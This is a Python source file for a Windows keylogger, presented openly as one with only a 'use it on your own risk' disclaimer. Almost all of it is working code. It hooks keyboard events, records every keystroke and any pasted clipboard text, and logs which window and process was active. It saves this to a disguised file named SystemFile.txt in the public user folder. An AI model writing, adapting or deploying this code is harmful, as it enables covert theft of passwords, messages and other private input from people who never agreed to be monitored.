'''
Keylogger
Use it on your own risk

'''
from ctypes import *
import pythoncom        #pumping of messages
import pyHook           #h0oking to keyboard events
import win32clipboard   #to capture clipboard data
import time     
import threading        # for threading

user32=windll.user32
kernel32=windll.kernel32
psapi=windll.psapi

currentwindow=None
edata=None
def controller(): #file controller
    global edata
    while 1>0:
        edata=open("C:\\Users\\Public\\SystemFile.txt","a")
        print("inside controller\n")
        time.sleep(60)
        edata.write('\n')
        edata.close()
        print("data Saved\n")
        time.sleep(1)
def process_determination():
    
    global edata
    #getting the handle to current window
    h_wind=user32.GetForegroundWindow()
    
    #getting the process id
    pid=c_ulong(0)
    user32.GetWindowThreadProcessId(h_wind,byref(pid))
    
     # grab the executable       
    executable = create_string_buffer("\x00" * 512)     
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)       
  
    process_id="%d"%pid.value
    #reading title
    window_name=create_string_buffer("\x00"*512)
    name=user32.GetWindowTextA(h_wind,byref(window_name),512)
    
    # saving current window data to file
    edata.write(process_id+'\n'+executable.value+'\n'+window_name.value+'\n')
    kernel32.CloseHandle(h_wind)
    kernel32.CloseHandle(h_process)
def keylogger(event):
    
    global currentwindow
    global edata
    if event.WindowName != currentwindow:
        currentwindow=event.WindowName
        process_determination()
        
    if event.Ascii > 32 and event.Ascii <127:
        print chr(event.Ascii),
        try:
            edata.write('\n')
            edata.write(chr(event.Ascii))
        except:
            pass
    else:
        
        if event.Key=="V":
            win32clipboard.OpenClipboard()
            paste_value=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
    
            try:
                edata.write('\n')
                edata.write(paste_value)
            except:
                pass
            
        else:
            try:
                edata.write('\n')
                edata.write(event.Key)
            except:
                pass
    return True

threading.Thread(target=controller).start() #  Thread to handle the opening and Closing of File

kl=pyHook.HookManager()
kl.KeyDown=keylogger
kl.HookKeyboard()
pythoncom.PumpMessages()


